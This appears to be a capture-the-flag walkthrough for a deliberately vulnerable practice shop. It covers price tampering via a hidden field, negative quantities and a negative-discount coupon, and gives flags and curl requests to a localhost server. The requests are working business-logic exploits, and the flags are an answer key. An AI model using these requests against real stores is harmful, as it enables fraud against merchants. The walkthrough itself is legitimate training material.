# Business Logic — PhantomShop Walkthroughs

## 1. Price Manipulation (Medium — 200pts)
**Flag:** `FLAG{pr1c3_m4n1pul4t10n}`
**Location:** `/cart/add`

### Vulnerability
The price is submitted from a hidden form field — the server trusts it:
```html
<input type="hidden" name="price" value="89.99">
```

### Solution
Intercept the request (Burp Suite) or use curl:
```bash
curl -X POST http://localhost:8080/cart/add \
  -d "product_id=1&price=0.01&quantity=1"
```
Product added for $0.01 instead of $89.99.

---

## 2. Negative Quantity (Hard — 300pts)
**Flag:** `FLAG{n3g4t1v3_qu4nt1ty}`
**Location:** `/cart/add`

### Solution
```bash
curl -X POST http://localhost:8080/cart/add \
  -d "product_id=1&price=89.99&quantity=-5"
```
Negative quantity creates a credit — you get money back instead of paying.

---

## 3. Coupon Abuse — Negative Discount (Medium — 200pts)
**Flag:** `FLAG{c0up0n_4bus3}`
**Location:** `/apply-coupon`

### Vulnerability
The coupon `NEGATIVE` has a -500% discount — it ADDS money to the total.

### Solution
```bash
curl -X POST http://localhost:8080/apply-coupon \
  -d "coupon=NEGATIVE&total=100"
```
The total goes UP by 500% instead of down. In a real store, this would charge the company instead of the customer.

### Other coupons to try
- `WELCOME10` — 10% off (legitimate)
- `VIP50` — 50% off
- `ADMIN100` — 100% off (free order!)
- `NEGATIVE` — -500% (increases total)
